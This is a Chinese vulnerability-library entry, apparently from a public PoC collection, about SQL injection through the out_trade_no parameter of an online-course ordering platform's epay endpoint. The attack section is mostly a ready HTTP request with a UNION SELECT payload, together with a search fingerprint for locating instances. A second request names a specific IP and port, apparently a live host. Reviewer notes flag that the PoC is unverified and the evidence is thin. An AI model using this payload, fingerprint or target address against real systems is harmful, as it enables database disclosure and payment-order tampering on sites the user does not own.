---
source: "wy876 漏洞文库"
title: "网课交单平台 epay out_trade_no SQL 注入"
product: "网课交单平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未知厂商版本，MySQL联合查询"
prerequisites: "未说明"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/na3widtrnccyuruh"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%BD%91%E8%AF%BE%E4%BA%A4%E5%8D%95/%E7%BD%91%E8%AF%BE%E4%BA%A4%E5%8D%95%E5%B9%B3%E5%8F%B0epay%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
id: "vw-17dcfe48a8a59937745846a1"
entity_id: "ve-17dcfe48a8a59937745846a1"
schema_version: "1"
---

# 网课交单平台 epay out_trade_no SQL 注入

## 条目说明

- 对象与具体问题：网课交单平台；epay out_trade_no SQLi
- 版本、配置及部署条件：未知厂商版本，MySQL联合查询
- 认证与权限前提：未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 注入请求与正常请求无对应返回，缺13列结构及回显位置
- 两不同body均Content-Length157明显静态
- 支付回调入口可能影响订单状态需注明；产品名太泛，指纹仅/apisub.php难定位唯一产品

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
网课交单平台是一款和发卡网对接的网课代学平台，拥有聚合支付，论文编辑等功能，其后台的可用性及可靠性得到了使用者的认可。网课交单平台某接口存在SQL注入漏洞。攻击者可以通过构造恶意的SQL语句，成功注入并执行恶意数据库操作，可能导致敏感信息泄露、数据库被篡改或其他严重后果。

## 二、影响版本
+ 网课交单平台

## 三、资产测绘
```http
"/apisub.php"
```


## 四、漏洞复现
```http
POST /epay/epay.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=1

out_trade_no=' UNION ALL SELECT 1,CONCAT(IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),3,4,5,6,7,8,9,10,11,12,13-- -
```

> 请求长度说明：原资料 Content-Length 为 157；静态长度已移除，应由客户端根据最终请求体的字节数生成。


```http
POST /epay/epay.php HTTP/1.1
Host: 101.33.219.180:89
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=1

out_trade_no=1
```

> 请求长度说明：原资料 Content-Length 为 157；静态长度已移除，应由客户端根据最终请求体的字节数生成。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/na3widtrnccyuruh>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
